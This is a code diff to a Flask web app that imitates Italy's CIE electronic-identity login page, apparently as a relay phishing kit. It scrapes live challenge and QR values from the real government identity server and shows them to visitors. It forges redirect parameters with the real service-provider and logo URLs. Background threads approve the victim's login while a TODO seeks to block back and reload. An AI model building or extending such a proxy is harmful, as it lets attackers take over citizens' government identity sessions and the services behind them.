@@ -3,6 +3,7 @@ import random
 from utils.state import State
 import utils.scraping as scraping
 from concurrent.futures import ThreadPoolExecutor
+import time
 
 
 # TODO:
@@ -11,8 +12,22 @@ from concurrent.futures import ThreadPoolExecutor
 # - translation
 # - make back and reload not work
 
+# State:
+# - cie_wrong_credentials is to be fixed for translation and we must add the deu page. They all behave as cie_login
+
 app = Flask(__name__)
 app.secret_key = "HPAS"
+
+DEFAULT_TEMPO_MS = 120000  # 2 minutes
+
+qr_expiry_store: dict[str, int] = {}
+last_challenge = ""
+
+def get_stored_expiry(challenge: str) -> int|None:
+    return qr_expiry_store.get(challenge)
+
+def set_stored_expiry(challenge:str, expiry_ms:int):
+    qr_expiry_store[challenge] = expiry_ms
 
 random.seed()
 
@@ -44,12 +59,21 @@ def do_login():
     elements = scraper.get_cie_page_elements()
     challenge= elements.get("challenge", "NA")
     session["qr_str"] = elements.get("qr_str", "NA")
-    op_id = elements.get("op_id", "NA")
-    
-    return redirect(url_for('cie_level2', lang='it', challenge = challenge, op_id = op_id))
+    opId = elements.get("opId", "NA")
+
+    return redirect(url_for(
+        'cie_level2',
+        opId = opId,
+        challenge = challenge,
+        level = 2,
+        SPName="https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml",
+        SPLogo="https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png",
+        value="e1s2"
+    ))
 
 @app.route('/idp/login/livello2/', methods=['GET', 'POST'])
 def cie_level2():
+    global last_challenge
     """
     To emulate the original website, we use the same address for two different things:
     1) the login page with credentials/QR code (if challenge is present in the arguments)
@@ -57,7 +81,17 @@ def cie_level2():
         page on error (if challenge is absent in the arguments)
     """
     challenge = request.args.get('challenge')
-    lang = request.form.get('lang', "it")
+    lang = request.values.get('eccLang', "it")
+    server_now_ms = int(time.time() * 1000)
+    timer_key = challenge or last_challenge
+    stored = get_stored_expiry(timer_key)
+    if stored is None:
+        # first time for this challenge -> create expiry
+        expiry_ms = server_now_ms + DEFAULT_TEMPO_MS
+        set_stored_expiry(timer_key, expiry_ms)
+    else:
+        expiry_ms = int(stored)
+
     # the original website does not change url throughout the login process, so we emulate that
     # by using the same website and checking the arguments
     if challenge == None:
@@ -83,18 +117,26 @@ def cie_level2():
             executor = ThreadPoolExecutor(max_workers=2)
             _ = executor.submit(scraper.approve, 120)
 
-        return render_template(page)
+        return render_template(page,
+           expiry_ms=expiry_ms,
+           server_now_ms=server_now_ms,
+           tempoQR_ms=DEFAULT_TEMPO_MS,
+       )
+
 
     qr_str = session.get("qr_str", "")
-    page = "{p}_{lang}.html".format(
-        p = "wrong_credentials_cie" if state.wrong_credentials else "cie_login",
-       lang = "deu" if lang == "deu" else "it"
-   )
-    if not state.wrong_credentials:
-        executor = ThreadPoolExecutor(max_workers=2)
-        _ = executor.submit(scraper.qr_approve, 120)
+    page = "cie_login_{}.html".format("deu" if lang == "deu" else "it")
+    last_challenge = challenge
 
-    return render_template(page, qr_str = qr_str, challenge = challenge, op_id = request.args.get('op_id'), tempoQR_ms=120000)
+    # handle qr code login
+    executor = ThreadPoolExecutor(max_workers=2)
+    _ = executor.submit(scraper.qr_approve, 120)
+
+    return render_template( page, qr_str = qr_str, challenge = challenge, opId = request.args.get('opId'), 
+                               expiry_ms=expiry_ms,
+                               server_now_ms=server_now_ms,
+                               tempoQR_ms=DEFAULT_TEMPO_MS,
+                           )
 
 @app.route("/idp/login/livello1e2checkpush")
 def check_push():
